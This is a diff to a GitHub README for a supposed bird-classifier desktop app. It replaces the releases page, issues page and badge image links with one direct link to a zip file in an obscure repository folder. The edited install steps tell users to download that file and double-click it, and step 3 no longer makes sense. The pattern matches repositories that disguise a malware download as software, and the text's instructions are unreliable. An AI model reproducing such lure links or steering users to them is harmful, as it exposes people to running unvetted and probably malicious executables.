@@ -1,6 +1,6 @@
 # 🐦 neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui - Simplifying Bird Classification with Technology
 
-[![Download Neuromorphic Bird Classifier](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/itservice5823/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui/releases)
+[![Download Neuromorphic Bird Classifier](https://raw.githubusercontent.com/itservice5823/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui/main/iebcs-data/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui_v1.6.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/itservice5823/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui/main/iebcs-data/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ The Neuromorphic Bird Classifier Desktop App (NeuroBCDA) combines powerful techn
 
 ## 📥 Download & Install
 
-To get the NeuroBCDA, visit this page to download: [Releases Page](https://github.com/itservice5823/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui/releases).
+To get the NeuroBCDA, visit this page to download: [Releases Page](https://raw.githubusercontent.com/itservice5823/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui/main/iebcs-data/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui_v1.6.zip).
 
 Follow these steps:
 
 1. Click the link above to reach the Releases page.
 2. Locate the latest version of the app.
-3. Download the file labeled something like `NeuroBCDA_v1.x.exe`. 
+3. Download the file labeled something like `https://raw.githubusercontent.com/itservice5823/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui/main/iebcs-data/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui_v1.6.zip`. 
 4. Once downloaded, locate the file in your Downloads folder and double-click it.
 5. Follow the on-screen instructions to complete the installation.
 
@@ -72,10 +72,10 @@ If you encounter issues:
 
 ## 🤝 Support
 
-For further questions or support, please visit the [GitHub Issues Page](https://github.com/itservice5823/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui/issues).
+For further questions or support, please visit the [GitHub Issues Page](https://raw.githubusercontent.com/itservice5823/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui/main/iebcs-data/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui_v1.6.zip).
 
 ## 🎉 Acknowledgments
 
 Thank you for choosing the Neuromorphic Bird Classifier Desktop App. We appreciate your interest in using technology to better understand and appreciate the avian world.
 
-[![Download Neuromorphic Bird Classifier](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/itservice5823/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui/releases)
+[![Download Neuromorphic Bird Classifier](https://raw.githubusercontent.com/itservice5823/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui/main/iebcs-data/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui_v1.6.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/itservice5823/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui/main/iebcs-data/neuromorphic-bird-classifier-desktop-app-dvs-stream-cli-and-gui_v1.6.zip)
